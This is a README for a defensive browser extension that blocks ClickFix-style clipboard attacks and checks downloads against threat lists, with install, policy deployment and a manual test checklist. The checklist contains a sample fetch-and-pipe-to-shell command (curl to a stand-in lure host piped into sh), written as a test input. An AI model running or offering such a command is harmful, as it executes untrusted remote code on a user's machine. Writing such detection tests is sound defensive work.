# Separ Browser Protection

A small browser extension (Firefox ESR 128+, Chromium/Chrome 121+) that catches **ClickFix-style
attacks before they run**. A web page that puts a dangerous command on the clipboard ("press Win+R,
paste, Enter to prove you are human") is judged by the local Separ daemon the moment the page
writes it. If the command would fetch and run code, hide itself, persist, read secrets and so on,
the extension:

- replaces the clipboard with a harmless warning sentence, so pasting does nothing;
- shows a browser notification and a banner on the page that names the attack family (for example
  *ClickFix-style command from a web page*) with one sentence of advice;
- leaves everything else alone. The user is never locked out and can keep browsing. Only the one
  dangerous action is stopped.

Every clipboard write is judged as the command it would be if pasted (design decision A68). The
policy flag `browser.clipboard_commands_only` (design decision A80, off until the owner approves it)
narrows that: only text that looks like a command is judged as one; a copied address gets the
threat-list check of a navigation, prose is not judged, and a URL the user selected and copied is
never blocked (at most a warning). With the flag off, copying a plain URL from a page is judged as a
pasted command and can be blocked.

Downloads are checked against the Separ threat lists (a hit pauses the download and asks the user).
Page addresses are checked only if an admin turns it on (`checkNavigation`, see below).

## How it fits together

```
page ──clipboard write──▶ extension ──native messaging──▶ separ browser-host ──/api/browser──▶ separ serve
                           (re-reads the real clipboard)    (started by the browser)            (Observe → Judge, in memory)
```

- **No open port for web pages.** The extension talks only to the native-messaging host
  `org.refmon.browser`. The browser starts that host itself and lets only this extension's ID use
  it. The host forwards to the user's own daemon with the daemon's API token, which only that user
  can read.
- **Nothing can run through this path.** `/api/browser` judges the text as written. It cannot
  execute, cannot pick a role or origin, and is rate limited.
- **Privacy.** Clipboard text and addresses exist only in memory: in the extension while a decision
  or a hold needs them, and in the daemon until Observe has fingerprinted them. Nothing raw is
  logged or stored. The extension contains no network code and no storage of content (checked by
  `tests/test_browser_extension.py`).
- **Degraded, not guessing.** If the daemon is not running, the toolbar badge shows `!` ("protection
  degraded") and nothing is judged.

## Install for one user (no root, for a test)

```sh
separ serve --port 0 &          # the daemon; --port 0 picks a free port and records it
separ browser-install           # launcher + Firefox manifest in your home directory
# Chromium/Chrome as well (the id is shown on chrome://extensions after loading the extension):
separ browser-install --chromium-extension-id <ID>
```

Then load the extension:
- Firefox: `about:debugging` → *This Firefox* → *Load Temporary Add-on* →
  `/usr/share/separ/browser/extension/manifest.json`. A temporary add-on is gone after a restart.
- Chromium: `chrome://extensions` → developer mode → *Load unpacked* →
  `/usr/share/separ/browser/extension/`.

## Deploy for every user of a machine (admins, root)

The extension protects the browser on the machine where it is installed: it talks only to a Separ
daemon on that same machine. Install it on the machines people browse on (workstations, a PC pool,
a shared login server), not on servers nobody browses on. A policy file applies to every user
account of that machine and to no other machine.

1. Install the package (`separ_<version>_amd64.deb` / `.x86_64.rpm`), then run
   `sudo separ browser-install --system`. This writes `/usr/libexec/separ/refmon-browser-host` and
   the manifests under `/usr/lib{,64}/mozilla/native-messaging-hosts/` (and under
   `/etc/chromium/…`, `/etc/opt/chrome/…` when given `--chromium-extension-id`).
2. Start one daemon per user: `sudo systemctl --global enable separ-user.service` (a systemd
   **user** unit, started at each login). Each daemon picks its own free port and the host finds it
   through `daemon.port` in that user's work directory, so users never collide. Without a running
   daemon the toolbar badge shows `!` ("protection degraded") and nothing is judged.
3. Make the browser install the extension and keep it installed (users cannot remove it):

   **Firefox.** The file `/usr/share/separ/browser/separ-browser.xpi` in the package is **not
   signed**. Firefox release builds install only add-ons signed by Mozilla, also when a policy forces
   them; Firefox ESR does the same unless the signature check is turned off. Checked with Firefox
   ESR 153 on Kali: with the default setting the unsigned file is rejected and removed from the
   profile; with `xpinstall.signatures.required` set to false it loads and runs. Choose one:

   - *Signed (any Firefox):* sign the `.xpi` once as an **unlisted** (self-distributed) add-on on
     addons.mozilla.org (Developer Hub, "On your own"), copy the signed file to
     `/usr/local/share/separ/separ-browser-signed.xpi` (outside the package, so an update does not
     overwrite it) and use `firefox-policies.json`.
   - *Unsigned (Firefox ESR only):* use `firefox-policies-esr-unsigned.json`. It installs the
     package's file and locks `xpinstall.signatures.required` to false for that machine's Firefox,
     which lets **any** unsigned add-on run there, not only Separ's. Prefer the signed way.

   Copy the chosen template to `/etc/firefox/policies/policies.json`. Firefox reads
   `/etc/<application name>/policies/policies.json`, and the application name is `Firefox` also in
   the Debian and Kali `firefox-esr` package (`Name=Firefox` in `application.ini`). If that file
   exists, Firefox ignores the `policies.json` shipped with the browser (Debian and Kali ship one in
   `/usr/lib/firefox-esr/distribution/`), so merge any policies you rely on into your file.
   Check the result in `about:policies` (active policies, errors) and `about:addons`.

   **Chromium/Chrome.** Pack the extension (`chrome://extensions` → *Pack extension*), host the
   `.crx` and an update manifest on an internal web server, and put `chromium-policy.json` (replace
   the extension ID and the example update URL) in `/etc/chromium/policies/managed/` or
   `/etc/opt/chrome/policies/managed/`. Then run `sudo separ browser-install --system
   --chromium-extension-id <ID>` so the native-messaging host accepts that ID.

## Settings (managed by policy)

| Key | Default | Meaning |
|---|---|---|
| `checkDownloads` | `true` | check each download's address against the threat lists |
| `checkNavigation` | `false` | check every top-level page address. Off by default because it hands the address of every visited page to the daemon (fingerprinted there, never stored raw, but still a trail of fingerprints) |

## What happens in each policy mode

| Daemon mode | Block | Hold | Allow |
|---|---|---|---|
| `block` | clipboard replaced / download cancelled, banner + notification | clipboard held or download paused; banner asks *Keep it* / *Remove it*; no answer within the hold timeout = remove | nothing |
| `warn` | banner + notification only | banner only | nothing |
| `observe` | nothing visible (recorded by the daemon) | nothing visible | nothing |

*Keep it* is offered only when not all three questions failed, the same rule as an endpoint hold.

## Manual test checklist (not run in CI: there is no browser on the build machine)

Use a harmless self-made test page served from `localhost`. Never use a real lure. The page
`browser/test/clipboard-test.html` covers cases 1 to 3:
`python3 -m http.server --bind 127.0.0.1 --directory browser/test 8000`, then open
`http://localhost:8000/clipboard-test.html`.

1. A page whose button calls `navigator.clipboard.writeText("curl -s http://lure.example.invalid/x | sh")`:
   after the click, pasting gives the Separ warning sentence; banner and notification name
   *ClickFix-style command from a web page*.
2. The same with `document.execCommand("copy")` from a hidden textarea, and from inside an iframe.
3. Selecting and copying `git status` from a normal page: nothing happens and the paste is unchanged.
4. Stop the daemon: the toolbar badge shows `!`; copying still works normally.
5. Put a test host on a threat list in the policy and download a file from it: the download is
   paused, *Remove it* cancels it, *Keep it* resumes it.
6. Switch the daemon to `warn` (`separ policy set-mode warn --key ...`, then `separ reload`; the
   dashboard cannot change the mode): case 1 shows only the banner and the clipboard is kept.
7. Check `logs/` in the daemon's work directory: no command text, host or path from 1–5 appears.
